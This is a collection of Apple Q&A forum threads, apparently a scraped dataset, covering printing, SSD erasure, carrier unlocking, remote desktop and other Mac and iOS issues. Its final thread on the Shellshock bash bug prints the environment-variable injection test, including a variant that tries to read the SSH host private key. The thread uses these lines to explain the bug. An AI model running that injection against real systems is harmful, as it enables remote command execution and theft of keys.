It seems like the shortcuts aren't loaded until I click the dropdown.  What am I missing?\n\nA: Neat trick, never thought about it!\nSo I tried this and I could repro your scenario, the signature will not be inserted until the \"signature\" dropdown is invoked.  I found that this had to be done every time you wanted to invoke the shortcut, which is a clear bummer.\nI also found that when composing a message right after Outlook starts,  if you select (from the main menu):\nDraft -> Signatures (select nothing just let the menu go once the signature submenu is displayed)\nThen the shortcut will work for all the messages you compose thereafter.\nNot the best solution, but better than having to click that signature dropdown everytime.\n", "Q: Mac printing error: paper size unresolvable conflict I am trying to set duplex as the default for my printer. Many people have told me to just create a preset and use that but there are some apps that this doesn't work for, so I am looking for a different solution. Another option I have found is to modify the CUPS settings on my mac for the printer. If I go into CUPS page for my printer, I change the two sided setting to on with long edge binding to be the default. This gives me an error though and wants me to change the default paper size to \"A4 two sided margins\". So I do that. Now whenever I go to print something, I get an error message come up:\n\"Changing the destination paper to A4 would cause a conflict that cannot be resolved. No change will be made.\"\nThe only thing I think could be causing this is that the default paper size setting in the printers section of system preferences is set to A4. There is no A4 Two sided margins option to select there. Maybe something else is causing the error.\nAny suggestions on how I could fix this?\nRunning Mac 10.9.4 and HP Photosmart 5520.\n\nA: An answer I posted on the HP forums http://h30434.www3.hp.com/t5/Mac-Printing-and-Scanning/Trouble-trying-to-set-duplex-printing-as-default/m-p/4541236/highlight/false#M52949\nI think I have found an interim solution, however, HP you MUST FIX THIS! This is a terrible way of having to set it up and it definiterly does not encourage me to buy HP products in the future. Please fix this and push a Mac driver update or printer firmware update or whatever is required.\nHere is what I had to do but I am not confident that it is going to actually work all of the time :/\nThe different applications seem to have different key names for each of the individual settings in a printing preset. So a preset made in Safari would not work properly in MS Office. However, if you create a preset in Word it sort of works in Safari. In Word's print dialog, I first set the paper size to scale to \"A4 Two sided margins\", then selected the two sided print option and saved this as a preset. Here's the weird part; the two-sided checkbox is ticked if I select the preset but if I go into the \"show Presets\" option that shows the details of the presets, it says that two-sided printing is off! The same weird thing happens in Safari's print dialog. It is because of this contradiction that I don't really trust this solution but it seems to work for now.\n\n\nHP FIX THIS PLEASE!\n", "Q: No FaceTime app after iOS 8 upgrade Upgraded to ios8 on my iPad air. There is no FaceTime app on the settings page to turn or or off. How to I set up face time\n\nA: Since this is a strange and unusal thing that I have never heard of, I can't offer a single solution, however I can offer multiple procedures to try and solve the problem.\n\n\n*\n\n*Turn your iPad off and back on. Simple yes, but don't underestimate the power this procedure can do. It works wonders!\n\n*If that didn't work, try resetting all of your settings. This can be acheived by opening the settings of your iPad and navigating to General -> Reset -> Reset All Settings. This will not cause you to loose any data, however anything in the settings app will be set to their default settings, ranging from iCloud login, WiFi networks, wallpapers and even your ringtone will be set to the default. No data will be lost, but you will need to sit with the iPad for a solid few minutes reconfiguring it again to its proper settings.\n\n*Hopefully that worked, because if it didn't it's time for a device fresh restore. This is where you will need to get a computer and a USB to lightning cable and hook it up to iTunes. This procedure will force EVERYTHING to be removed from the device unless you restore it from a backup. So before you do anything, make sure you create a backup by going File -> Devices -> Back Up. Now that you have your backup this step splits into two options for you.\n\na) Click on the Restore button in the device summary page to wipe the device clean. Once installation is finished and while the iPad is still connected to the computer you may select Restore From Previous Backup. This will restore everything back onto the device, including apps + their data, photos and anything else, even your wallpaper at the time. If the setting STILL isn't there. Then there is no choice to do a full restore and keep it that way\n\nb) The best way to go about is is enable iCloud and sync all of your contacts/calendars/anything else to it if you haven't done so already. Also, a nifty new feature is iCloud Photos where it stores your photos in your drive. You can use this as a first line of backup for photos but if you want you can copy them off your computer while its still plugged in (eg iPhoto if you are on a mac). Once all your important data is backed up somewhere other than the device, hit that Restore button once again. Let it finish and go through the step by step tutorial to setup as a new device.\nProceed to restore all your data by logging into iCloud/redownloading your apps/changing settings once more, but before you do any of this, check to see if the FaceTime setting is there again. If it isn't, you may as well restore from the iTunes backup once again and this time call Apple for support.\nHope it doesn't have to get anywhere further than option 1 but if all else fails I hope it works out for you. Good luck! :)\n\nA: I have the same issue. It was when I upgraded but disappeared later. \nNothing on my settings page concerning Facetime. \nTried reset and the result was positive. It did the trick for me. Bad thing I had to reset all my settings back.

After reading this page online, I got stunned, please go through the link, you will find that it says: \n\nWhile Apple and the major wireless carriers usually advertise the iPhone 6′s $199 price, that’s just the starting price for those that are signing up for a two-year contract and are eligible for an upgrade. The full retail price for the 16GB iPhone 6 is actually $649 and a lot of people are going to spend that much or more either upfront or through a payment scheme like Verizon Edge, which is essentially a payment plan that spreads the $649 cost over 20 months and allows subscribers to upgrade to the next generation iPhone after just a year.\n\nMy question is, is it a good idea to use a payment scheme like Verizon Edge with the iPhone 6?\n\nA: \nVerizon Edge is a program that provides you the flexibility to upgrade\n  early, and pay for your device over 20 months rather than paying for\n  it all upfront. You’ll make a monthly payment until your device is\n  paid off.\nAfter 30 days, if you’ve paid at least 60% of the Edge device,\n  you’ll have the option to Edge Up to a new device without any upgrade\n  fees.\n\nWhat does it mean?\nYou will have a 2 Years contract with Verizon and have to pay the additional Verizon service costs (phone+Data). Now each time you Edge up to next phone the clock starts all over again. (2 Years contract).\nThe only benefit is you do not have to spend the cost of the iPhone up front, but over 2 Years, and the ability to get a newer model.\nFor Verizon you will pay >$60/M for network services. With some other providers you will pay $40/M for about the same services.  Difference of 720/480 is $240 per Year that you pay more.\nSo you actual cost after 2 Year with Verizon is 649+720+720 =$2089, while direct buy will cost you 649+480+480= $1609.\n", "Q: Why is a secure erase 'not necessary' for SSD's? I'm about to trade in a 2010 MacBook Pro with an SSD. However, I'm unable to do a Secure Erase from the recovery disk (as I used to do with mechanical hard drives before selling or giving away a computer) since the \"Security Options\" button is grayed out.\nBased on an article in Apple's knowledge base, the button is intentionally disabled for SSD's because:\n\nNote: With an SSD drive, Secure Erase and Erasing Free Space are not\n  available in Disk Utility. These options are not needed for an SSD\n  drive because a standard erase makes it difficult to recover data from\n  an SSD.\n\nThis sounds good to me, and this view was confirmed both at the Genius Bar and by calling Apple.\nThe problem is that almost every article I can find on this subject contradicts Apple's optimistic view about erasing an SSD. Because SSD's dynamically remap blocks on write and because they have large chunks of free space inaccessible to the OS, it's impossible to overwrite the entire drive.\nThe single explanation that could reconcile these two perspectives is that MacBook SSD's are \"self-encrypting\", i.e. they generate a random key and store it in the disk's metadata and encrypt all data stored to the drive with that key (additional explanation here). When I use Disk Utility's Erase button on an SSD, the Mac clears out that key, so even though the data hasn't been overwritten, it's all inaccessible ciphertext now that the key is gone, and is as good as zeroed-out.\nThe problem is that all I can find to back this view up is a post by a knowledgeable member of the Apple Support Forums. Does anyone know if this is really true? Could you point me to something verifying that Apple's SSD's do this?\n\nA: The problem that I see with \"almost every article\" is that they're 3-4 years old. Some of them even mention attempting degaussing the drives as a means of clearing out data. That implies a lack of understanding of how Flash storage works in the first place. Seriously. Degaussing?\n\"ATA Secure Erase\" is a means of telling the drive to zero out all the blocks. As well, simply mounting an SSD and deleting all the files with TRIM enabled will cause all the pages to be zeroed on any block that contained data. Of course, that assumes that TRIM has been correctly implemented. Usually, TRIM erase commands are completed by an SSD controller in a few minutes.\nhttp://en.wikipedia.org/wiki/Write_amplification\nhttp://en.wikipedia.org/wiki/Data_remanence#Data_on_solid-state_drives\nIt's worth noting that this business of recovering data from erased SSDs is not possible by your garden-variety hackers. The techniques the white papers generally describe involve disemboweling the drives and examining individual memory components.\nFrom a consumer-grade perspective, it should be more than sufficient to boot to your recovery partition, delete the primary data partition, repartition the volume and format. It's hard to imagine anybody buying a used MacBook and hunting for data. If you really want to go the distance, you can encrypt your drive with FileVault prior to removing the partitions. At that point, even if a would-be cracker were to hack apart the drive to hunt for data, anything they found would be encrypted anyway.\nI just don't consider that to be likely. If you really cannot take the chance, then purchase a replacement HDD and trade it in keeping the SSD.\nI also agree with njboot: Linc knows his stuff.\n\nA: Not so much that it's not necessary...\nI'm a couple years late to the party, but it might be worth pointing out that Apple (who has now entirely remove \"Secure Erase\" options from the Disk Utility app) hasn't really removed the option because it \"isn't necessary\" — according to its El Capitan security release notes, they did it because they can't guarantee a secure erase:\n\nDescription: An issue existed in guaranteeing secure deletion of Trash files on some systems, such as those with flash storage. This issue was addressed by removing the “Secure Empty Trash” option.\n\nGlenn Fleishman, gives a good overview of this in \"How to replace El Capitan's missing Secure Empty Trash.\" The fact that, currently, the only DoD/NSA approved SSD sanitation procedure is smelting or shredding the drive into a fine powder somewhat echoes the challenge in being able to wipe a drive, for sure.\nIt is pretty difficult to recover data from an SSD...\nAs Trane Francks explained, recovering data from an SSD is, by default, pretty difficult. The data isn't necessarily encrypted, but it is distributed data over many locations in order to perform as few writes as possible to a single location (both for performance and for drive longevity). So once data is deleted, find the place a file used to reside in is like putting together a multi-million piece jigsaw puzzle (all before any garbage collecting the drive may decide to do). It is possible to recover files from an SSD, but this usually requires a lot of extra effort.\nTo make it hard for recovery tools...\nEncrypting a SSD with any kind of suitably secure key, and then erasing that key, makes it virtually impossible to recover any data. This can be done, on a Mac, by enabling FileVault, booting into recovery mode, unlocking and then deleting the drive with Disk Utility.\nIf you're just looking to make sure stuff is securely erased without nuking existing data, you could try using the diskutil terminal command — the command line version of DiskUtility, wherein secure erase options have not been removed:\nsudo diskutil secureErase freespace 0 \"/Volumes/[Disk Name]\"\n\nThis should attempt to write and delete a couple tempfiles which will fill up the entire hard drive. In doing so, every available space should be filled and then cleared.\nGood information on all these options can be found in \"How to Securely Erase a Mac SSD\".\nAlso, you can always try to run some data recovery tools to see if there is data that is still immediately available.\n\nA: The correct answer of course is that instead of \"secure erase for ssds\" there should be a feature called \"replace ssds hardware encryption key\".\nThen, once the SSD where user did not use separate encryption goes into read-only state, you can send the command to replace the key. \nFor performance oriented use it would also be preferable that bitlocker would have option to use only the hardware level encryption if support is present. Depending on the config (ultrabook vs desktop) there might be some perf and power saving features. Eg. if you have ultrabook running at TDP cap like Surface, then run some VM's in it, there could be some battery waste from doing encryption twice. Hard to say if it's significant or not without actual measurements but I have measured on desktop that bitlocker does affect ssd perf a bit so it's expected theres some impact.\nAlso since I separately encrypt the VM's, the system actually has 4 layers of encryption : ssd internal, host bitlocker, vm guest bitlocker and finally folder encryption. The VM are synchronized to external USB SSD so if the laptop or your bag is taken/lost during travel then it's likely that you atleast have one these so you can just buy another ssd or laptop and resume work as if nothing happened. Changes are differentially uploaded to cloud backup. The reason for not solely using cloud storage is that some work can require a lot of local assets available with low latency such as game development for example or studio work.\n\nA: man diskutil\n\nsecureErase\nErase, using a \"secure\" (but see the NOTE below) method,\neither a whole-disk (including all of its partitions if partitioned),\nor, only the free space (not in use for files) on a\ncurrently-mounted volume.  Secure erasing makes it harder to\nrecover data using \"file recovery\" software.\n...\nThis kind of secure erase is no longer considered safe. Modern devices have wear-leveling, block-sparing, and possibly-persistent cache hardware, which cannot be completely erased by these commands. The modern solution for quickly and securely erasing your data is encryption. Strongly-encrypted data can be instantly “erased” by destroying (or losing) the key (password), because this renders your data irretrievable in practical terms. Consider using APFS encryption (FileVault).\n\nSource:\n\n*\n\n*https://twitter.com/cabel/status/1143672409058234368\n\n*https://mjtsai.com/blog/2019/02/06/secure-erase-and-mojaves-disk-utility/\n\n*https://eclecticlight.co/2018/12/17/disk-utility-18-0-mojave-not-exactly-the-truth/\n", "Q: How do I get current location by using Google Map or Apple Map How do I get current location coordinate by using Google Map or Apple Map?\nI want to copy and paste to email/whatsapp/waze.\nI want some kind of this format. 3.1739161,101.984351\nAnyone can help?\n\nA: I've never understood why we couldn't get location coordinates from Apple Maps etc. Seems like such an obvious function.\nHowever, you can use the default Compass app and it'll give you your current location at bottom of screen.

I'm thinking of buying a 13.3\" MacBook Pro that a store has at low prices right now.\nWill this come with the OS registered in the app store? I ask because I plan to switch out the disk for an SSD, and with my previous MacBook Pro I could simply input my App Store credentials during boot and it would download and install everything directly.\nCan I do this with a new MacBook Pro, or will I have to buy a separate copy in the app store to get this function?\n\nA: The first time you start up the system and log into the OS, you'll be prompted to create an Apple ID or connect to an existing one. That will register the OS as 'purchased' and enable you to do Internet Recovery or download the OS from the App Store.\nIf you're using a MacBook with the same OS as currently available on the new MBP you wish to buy, it may be possible to simply take the SSD out of your existing MacBook and plug it straight into the Pro. (This has worked with me in the past with taking an SSD out of a MacBook2,1 and putting it into a MacBook4,1.) \nAs for having to purchase the OS again, Mavericks is free.

I immediately started using the new Health app.  I added the basics, birthday, age, sex, weight, and I added the \"Steps\" and \"Walking + Running Distance\" to the dashbaord.  I notice they automatically started tracking my steps.  So I went for a jog, it tracked that also.  Awesome, so far so good.  But the next day it was all gone.

I've checked each day since I've got the phone, each day it seems to start over.  Why is all the previous data disappearing?\n\nA: This is a total speculation but I think this might be because the data you are viewing is generated by the M8 co-processor and it only stores data for a relatively short space of time. The idea being that other apps are meant to take the data from the co-processor and store it, and the M7/M8 co-processors themselves just have a little memory to cover periods when the device is turned off.\nMy guess is that if you install another app that tracks movement (once you have installed 8.0.1, when it is safe to install), then they'll take over the role of storing and supplying data to the Health app.\n", "Q: Remove full name from login window In Mountain Lion, my full name is displayed at the bottom of the log in menu.

If you hold your finger over a URL it just selects part of it and offers to Copy or Define it.\nI also tried the Gmail app and it just offers the same three options as Mail.\n", "Q: Is it possible to automatically back up my mac to Microsoft OneDrive? I'm not sure there is a way to do what I want to do.  Now that I have Office 360 + 1TB of free space, I'd like to set my mac to do monthly backups to OneDrive.  I'm looking for the following features.\n\n\n*\n\n*Sync + Upload\n\n*\n\n*Sync: would be great if it just uploaded changed files\n\n*Direct Upload: rather than just dropping files into the OneDrive folder, so my local Hard Drive doesn't explode.\n\n\n*Starts automatically, runs in the background\n\n\nIs there any combination of software that can accomplish this?  I've done a fair amount of googling and can't seem to find a solution.  Basically looking for \"Carbonite\" but instead - using Microsoft OneDrive.\n\nA: IF the onedrive is mounted then you can use sync and cron with a script\n(Please note on kindle fire and format may be off so this will be simple):\ncd $HOME\nrsync -ar . /Volumes/<mount point of one drive>\n\nThis has more details:\nOnce you have saved script, and gave it execute permission, use crontab -e to add your frequency.  \nPlease see this for crontab example (I can not give proper screen display with kindle)  \nIf the drive is not visible with df, then I am not sure. \nFollowing up on this answer, you could use this utility to mount your OneDrive folder and to the backup using the info above: \n\nA: You can take a look at python-onedrive.  It takes a little work to setup but it works for the most part.  I have used it with folder actions and launch agents to auto upload files when put in certain folders places within my mac.\n\nA: timshutes - mounting does NOT mean you use local space. ExpanDrive should work just fine for your application. You could probably even put a sparsebundle there and use TimeMachine to backup to it.\n\nA: I have been investigating a product called CloudBacko which does exactly that.  It claims Windows, Mac, Exchange, and more backed up to Google Drive, OneDrive, S3, and many more, even aggregating multiple destinations.  It seems to be based on a white-label backup product called Ashay.  The Home version is free and claims to offer some support for versioning as well, but does not offer monthly backups according to the feature chart.  The cheapest paid version (Lite) offers monthly for a one-time $19 which they say is a perpetual single license.

I understand that turning on Find My Mac also turns on a \"Guest\" account (in \"login only\" mode). For a variety of reasons, I would prefer not to have an enabled Guest account at all. \nDoes Find My Mac still function with the Guest account turned off? Is its functionality limited in some way by the absence of the Guest account. Or will the Guest account be re-enabled by Find My Mac when I reboot?\n\nA: Yes, it will still function without the guest account.  However, in order for Find my Mac to locate your Mac, the Mac needs to be connected to the internet.  If your account is secure and your Mac is stolen, presumably the thief would not know your password, and so wouldn't be able to login and join a WiFi network.\nLeaving guest access enabled allows them to login without a password, in the hopes that they then join a WiFi network and your Mac is located (and immediately locked/wiped/etc).\n", "Q: Prompting user for input on locking screen I'm relatively new to OSX (running Mavericks), but my goal is to create a script that reminds me to take notes on the day's work. The script will ideally: run upon the user clicking 'Login window' (i.e. lock screen) and prompt the user for whether or not they want to record notes (ok/cancel). If the user answers OK, then the script will ask for a multiline input, then append the date and time, plus that input, to a text file before locking the screen. If the user clicks cancel or 15 seconds pass without interaction, the dialog should be dismissed and the screen will lock.\nI'm:\n1) unsure about how to prompt the user for multiline input\n2) unclear how to trigger the script on the user requesting a return to the login window (lock screen?)\nIf this can be accomplished through a third-party program/interface, I'm open to that as well. Thanks!\n\nA: Keyboard Maestro.\nWhat you want to achieve requires a daemon that runs in the background, launches with the system, and executes customized commands/scripts after detecting a trigger. It's no a small feat if you want to write one that has good stability.\nApart from the keys, Keyboard Maestro has triggers like Startup, System Wake, Login, While Logged In, etc. With some tweaking and compromise, this is the best shot I know.\n\nA: \nhow to prompt the user for multiline input\n\nYou can use the following AppleScript:\ndisplay dialog \"\" default answer linefeed\n\nSource: How Can I Create a Multi-Line Input Dialog using Applescript?\n\nhow to trigger the script on the user requesting a return to the login window\n\nThis depends entirely on how the user is requesting this.

There are a number of possibilities here, but that should be a starting point.\n", "Q: How can you unlock a Sprint iPhone 6 Plus? It was paid in full without a contract I purchased a Sprint iPhone 6 Plus 64gb off contract. I paid the full amount which was about $1,000. As of today (2014-09-24), how can we unlock the iPhone 6 Plus which is on Sprint? I am a Sprint customer. \n\nA: Sprint phones CANNOT normally be unlocked for use with any other carrier in the U.S., with the exception of Ting mobile, which uses the Sprint network. Additionally, both Sprint and Verizon are on CDMA networks, so any restrictions imposed on transferring is fabricated by those companies for profit. Additionally, many new phones, including iPhones work with both CDMA and GSM, the only thing stopping you from transferring is the company.\nHere is a lame excuse from an actual Sprint technician:\n\nBetty S: Some Apple devices have an MSL code, while others do not, however, even unlocking the software using the MSL code will not enable these phones to operate on a domestic carriers’ network\nBetty S: Apple phones sold for use on Sprint's network are designed with an external SIM slot and sold with a SIM card to operate on Sprint's network.\nBetty S: Those devices are not enabled for use on a different domestic carrier’s network because the Sprint-specific CDMA requirements are hardcoded in the firmware of the device and downloaded for operation on Sprint’s network and specific frequencies.\nBetty S: This is true even within Sprint’s Network, for instance between Sprint and Virgin Mobile. These phones, if sold through a Sprint channel were not engineered as a universal Domestic device.\nBetty S: Even if these devices have MSL codes that can be unlocked, the SIM cannot be enabled for use on a domestic carriers’ network.\n\nWhile the firmware being different is true, it is only that way to stop customers from leaving with their devices.\n\nA: Unlocking Sprint in the USA is not possible currently and will not result in any benefit, so your best option is to bring it back and get your money if you do not like to be in the cage.\n\nIf you’re using a Sprint prepaid affiliate, like Virgin or Boost,\n  Sprint currently cannot unlock those devices. Supposedly help is on\n  its way — as these policies are in violation of the CITA’s unlocking\n  agreement, new, more consumer-friendly policies should be in place by\n  February 11, 2015.\n\nFor International see this information.\nBasically how the International works is true Sprint agreement for Roaming:\nMeans they have a contract with \n\ncountless GSM Roaming and International CDMA Roaming partners.\n\nSo what does all that means to you:\nIf you are in the USA then\n\n\n*\n\n*Sprint will not unlock the phone so you can use it on Verizon (while on the same technology (CDMA), the reason is not technical it is business.\n\n*Sprint will unlock the phone for International use with GSM? but will not allow you to use ATT, T-Mobile in the USA. The reason again is business and not technical (even so if your Sprint iPhone has the capability).\n\n*Sprint is not in compliance with the USA law that becomes active in Feb. 2015, and they know that. They will change they company business policy from that date forward to comply with the new law, but as far I know it will not be backwards compatible (for iPhone bought before that date).\n\nA: I just bought a iPhone 6 Model A1586 (Sprint) today at an US Apple Store. I put in my T-Mobile Germany SIM before turning it on and it works fine.\nAs a Sprint customer all you can ask is an unlock for international use as far as I know.\n\nA: I'm sorry to say that you have a iPhone that is useless for you. \nFrom http://www.sprint.com/legal/unlocking_policy.html\n\nNot all Sprint devices have an MSL code or a locking function that can be unlocked by Sprint (e.g., Apple devices cannot be unlocked to accept another domestic carrier's SIM card). \n\nThe confusion is that they have to \"unlock for international\" use by law. Often online it's mentioned as \"unlocking\".\n\nA: Just called sprint about this and unlocking their phones in general. it goes for any phone, not just iPhone 6. it seems that sprint requires any NEW phone purchased on the account to be ACTIVE for 90 days in order to unlock it for \"international\" use.\nSo as for the iphone 6, since its released in sept, we have to wait 90 days, which is sometime in December 2014 before we can unlock it on our account to use it overseas. And NO they will not unlock it for other domestic carriers. \nSo if your thinking about buying the iphone 6 from sprint to flip for a profit, don't bother. This sprint 90 day active line restriction kills it. You actually have to have the iphone 6 ACTIVE on your line, which means you actually have to be using it before they unlock it. \n\nA: ontact Sprint Customer Care by dialing *2 from your Sprint mobile device or call 888-211-4727, if you bought as full price and no contract with sprint, they should give you the MSL code according their policy (Requesting the Master Subsidy Lock code):\nhttp://www.sprint.com/legal/unlocking_policy.html\nif you have contract with sprint, you want to unlock it, you need to pay remain money to Sprint, if you have no money and you want to use the Sprint Iphone6 for international travel (use other operators' SIM card), just wait 90 days.\n\nA: I bought an Iphone 6 from Sprint paying the full price too. But in my case is to use in Brasil. I received a recommendation from a apple store employer to not use in the first power on the chip of Spring, this will let the iphone unlocked to use in others country except USA.\nHope this help anyone...\n\nA: You need to contact Sprint.  If the phone is locked to their network, they can provide instructions and a code to unlock it.\n", "Q: Opening apache conf file with write permissions I'm trying to open the /private/etc/apache2/httpd.conf file to make some changes. I thought I'd be able to open this with the correct permissions from the command line, so I tried:\ncd /private/etc/apache2\nsudo open -a TextEdit httpd.conf\n\nThis opened the file in TextEdit, but TextEdit gave me this message:\n\nYou don't own the file \"httpd.conf\" and don't have permission to write to it. \n  You can duplicate this document and edit the duplicate. Only the duplicate will include your changes.\n\nFine. Apparently using open even with sudo opens the app as the user. So I tried this:\nsudo /Applications/TextEdit.app/Contents/MacOS/TextEdit httpd.conf\n\nBut I immediately get this popup:\n\nThe document \"httpd.conf\" could not be opened. You don't have permission.\n  To view or change permissions, select the item in the Finder and choose File > Get Info.\n\nThis makes TextEdit hang too, so I have to force quit it. \nI also tried to open the file using my Komodo text edit, which is my normal development environment: \nsudo -b /Applications/Komodo\\ Edit\\ 8.app/Contents/MacOS/komodo httpd.conf\n\nThe terminal spits out this strange message:\n\n2014-09-24 11:48:29.583 komodo[30647:507] * WARNING: Method userSpaceScaleFactor in class NSWindow is deprecated on 10.7 and later. It should not be used in new applications. Use convertRectToBacking: instead. \n\nAnd Komodo opens, but doesn't open the file. How do I edit this file with my program of choice? \n\nA: The reason these applications can't write to that files is to do with application sandboxing feature of OS X, which you can read about here if you are interested.\nOne GUI application that can write to these files is TextWrangler which you can download for free here. There is also a version of TextWrangler in the Mac App Store (MAS) but it doesn't have the ability to write to system files by default (MAS guidelines don't allow applications with those abilities), but you can find an update here that will update the MAS version of TextWrangler so that it can.\nAlternatively you can use command line tools to edit these files. For example sudo nano https.conf works okay, and nano is relatively user friendly.\n\nA: To expand on 'dylans'' point, you can use Sublime Text to edit files and open them straight from the Terminal. The CLI utility that Sublime provides called subl.\nTo use Sublime Text 3: \nopen /Applications/Sublime\\ Text.app/Contents/SharedSupport/bin/subl\n\nFor Sublime Text 2:\nopen /Applications/Sublime\\ Text\\ 2.app/Contents/SharedSupport/bin/subl\n\nNext, create symlink named sublime that links subl CLI to a folder that can execute these binaries:\nSublime Text 3:\nln -s \"/Applications/Sublime Text.app/Contents/SharedSupport/bin/subl\" /usr/local/bin/sublime\n\nSublime Text 2:\nln -s /Applications/Sublime\\ Text\\ 2.app/Contents/SharedSupport/bin/subl /usr/local/bin/sublime\n\nNow check that the symlink was created in the correct place:\nopen ~/.bash_profile\n\nIn your profile, make sure this folder is somewhere in your $PATH. If not, add it:\nexport PATH=/usr/local/bin:\n\nIf no $PATHs are set, type this line in your bash_profile and then refresh/source it:\nexport PATH=/usr/local/bin:$PATH\nsource ~/.bash_profile\n\nThese commands should now allow Sublime to be opened automatically:\nsublime . - To open current directory in Sublime\nsublime filename – To open a file (replace 'file' w/ actual name i.e. 'httpd.conf')\nFor reference or more detailed info goto https://gist.github.com/artero/1236170\n\nA: Sublime text 3 works for these files. \n", "Q: How to disable iTunes for one user I've searched both here and in all of the iTunes' preferences tabs.

The remote machines are both set as \"English (United States) - US\" for the input language, which matches what my Mac has. \nThe following is example of the key confusion:\n\\ maps to <\n< maps to .\n^ maps to ?\n{ (twice) maps to ^^ (but once does nothing)\n} (twice) maps to -- (but once does nothing)\n\nMost other keys work fine. What can I do to correct this keyboard mapping on either the host (OSX Mavericks) or the client (Windows 7)?\n\nA: I had the same problem using microsoft remote desktop on a mac with OSX Yosemite. My symbol keys did not work correctly, for example the \\ became < and @ became *. I opened system preferences on my Mac that was running the RD client, and under keyboard I noticed that my input source was set to Canadian English. I added US English, deleted Canadian English, and restarted the remote desktop session. The special characters were typed correctly after that.\n\nA: Found an answer in an App Store review of all places, but to get your @ and \" where you expect them to be, go to Remote Desktop / Connections / Keyboard and change Scanmode to Unicode.\n\nA: I also had this issue but for me it only started with recent Microsoft RDP for OSX updates. The switch between keyboard layouts was happening whenever I used the Left Alt + Shift key combination which was quite common (and very annoying) while using Visual Studio.\nOn the Windows machines I was RDPing to I went to Region and Language > Keyboards and Languages > Change keyboards..., then on the General tab of Test Services and Input Languages I removed all the unused items from the Installed Services list and clicked Apply. On the Advanced Key Settings tab ensure that only your selected service is displayed. You can also change the Left Alt + Shift key combination on this tab.\n\nA: This question is super old now, however this might help someone with a similar issue.\nMine specifically was with the backtick/tilda (`/~) key, above the 'tab' key. I was RDP'ing from OSX Catalina 10.15.5 into a Windows 10 machine.

I have upgraded my devices to iOS 8. All seemed well. However, today I noticed I was mising some password in Safari. Checking my iCloud settings, I noticed that keychain was turned off.

But no, my iPad also had the same problem.\nSo now iCloud wants my security code, which I had set more than ayear ago, and cannot remember.

It continued to vibrate when receiving messages and then began to vibrate every few seconds until it stopped working completely. I quickly put it in a bag of rice and the liquid indicating sensors don't seem to be activated but it still won't respond or be recognized by my computer. Is it time to give up or should I be patient and give it more time? If so, how long is long enough to know that it has reached the point of no return?\n\nA: The liquid sensors are only there to determine if the device is still good for warranty, they're placed in strategic spots where the Apple so-called \"geniuses\" can quickly look and tell you that your device isn't eligible for warranty anymore (even if your problem happens to have obviously nothing to do with water damage).\nIn fact, the places where the liquid sensors are located on your device (dock and headphone connector) aren't that vulnerable to water and you can usually wipe whatever liquid is in them and the device would still work. This has changed with the iPhone 5 though, and the liquid contact indicator is now inside the SIM tray, which is tightly closed and water is unlikely to get inside accidentally (you'd need to completely submerge the device, in which case it'll completely kill it).\nIf you happen to be lucky and your device is still under warranty I suggest you go to an Apple Store, you'll get it replaced immediately.\n", "Q: All of my downloads are failing.

They use CoreLocation, and declare Location Updates as one of their capabilities. This allows them to run continuously in the background (with caveats).\nBackground App Refresh allows an app that declares Background Fetch as one its capabilities to periodically (but infrequently) download small amounts of data in the background. The scheduling for background data fetch is left at the discretion of the operating system, and may actually get cut off after the app is not accessed for a number of days.\nBackground App Refresh is useful eg. for news apps, allowing them to have fresh content ready to display before you launch the app (as per Craig Federighi’s keynote presentation at WWDC 2013). This functionality is non-critical, and apps should be able to live with it disabled.\nFor further details, refer to Apple’s App Programming Guide for iOS.\nIf-This-Then-That also has a layman’s explanation of how some background operations work in iOS under the heading About iOS Background Syncing.\n\nA: But regarding your concern, from my testing it seems googlemaps are always running in the background when the navigation is on\n", "Q: Can I turn a bad video card iMac g5 into headless server?

Has anyone done this that can advise me of the pitfalls? Also, should I consider installing a server-grade hard drive?\n\nA: No reason you couldn't do this. If you have already enabled remote login for ssh or screen sharing then you are good to go! If not then as you say use target mode to amend the settings.

Some are calling it the \"shellshock\" bug. Since OS X is built off of Unix, is it vulnerable to attacks that exploit this bug? \nAs an end user, do I need to worry about an immediate fix? Or is it better for me to wait for an official software update from Apple?\n\nA: Yes you are technically vulnerable. So if you feel like panicking or billing a panicked client for a few hours of panic work, go for it!\nBut the reality is unless you allow SSH access from remote connections or a web server that runs server side scripting, you are not at risk. You are only truly vulnerable if someone you do not know can remotely access your machine & do so in a way where a Bash command can be executed.\nMeaning your desktop Mac—which really does not run server applications of any kind—is not at any serious risk. I am willing to eat some proverbial “humble pie” here, but I do not think the majority of Mac users out there will be at risk at the end of the day. \nSo this issue is mainly of concern to system administrators on Mac OS X & Unix/Linux servers exposed to the world, not desktop users who do not enable SSH sharing.\nPerhaps there is an edge risk of a Mac malware or virus being created to exploit this risk, but I doubt it.\nEDIT: And just to elaborate how this issue is—in my humble opinion—not really an issue to most average users, yes I can run the following command from bash on Mac OS X 10.9.5:\nenv x='() { :;}; echo vulnerable' bash -c 'echo hello'\n\nAnd I see this:\nvulnerable\nhello\n\nGuess what? That is only terrifying if you don’t rationally think this out. I had to already have been logged into my Mac to even open the Terminal. And to negate what I said about SSH above, to even get to the point I can run this test even if SSH is enabled I would still have to be logged in to begin with.  And then—let’s say I get access via SSH—the command does not allow me to do ANYTHING past my normal user rights such as this:\nenv x='() { :;}; echo vulnerable' bash -c 'cat /etc/ssh_host_rsa_key'\n\nMeaning if you truly are vulnerable to being exploited by this hack, your core security on the system would have to be so compromised that the fact that bash has a flaw is really the very least of your issues.\nThis is a concern from an overall control & rights issue as it as the potential to allow unintended access since the behavior extends outside of expected norms. But in my humble opinion, it is not a risk on par with OpenSSL or the garden variety “let me leave my password on a note taped to my screen” risks.\nAt the end of the day I am still patching all of my Linux/Unix servers I run as standard procedure. And will happily patch the Macs I manage once a fix is out. But for practical day-to-day use I feel fine not worrying about this since I do not understand how a flaw that does not allow for elevated user privileges adds up to anything.\nUPDATE: Official word from Apple posted here; emphasis mine:\n\n“The vast majority of OS X users are not at risk to recently reported\n  bash vulnerabilities,\" an Apple spokesperson told iMore. \"Bash, a UNIX\n  command shell and language included in OS X, has a weakness that could\n  allow unauthorized users to remotely gain control of vulnerable\n  systems. With OS X, systems are safe by default and not exposed to\n  remote exploits of bash unless users configure advanced UNIX services.\n  We are working to quickly provide a software update for our advanced\n  UNIX users.”\n\nTranslation: What I said above about this being a server issue & not a client issue? Exactly.\nA FINAL UDPATE: For anyone struggling with compiling from source, as of September 29th, Apple has officially released patches for Mac OS X 10.9.5, 10.8.5 as well as 10.7.5:\n\n\n*\n\n*OS X bash Update 1.0 – OS X Mavericks\n\n*OS X bash Update 1.0 – OS X Mountain Lion\n\n*OS X bash Update 1.0 - OS X Lion\nYET ANOTHER FINAL UPDATE: And now, Apple has just released a 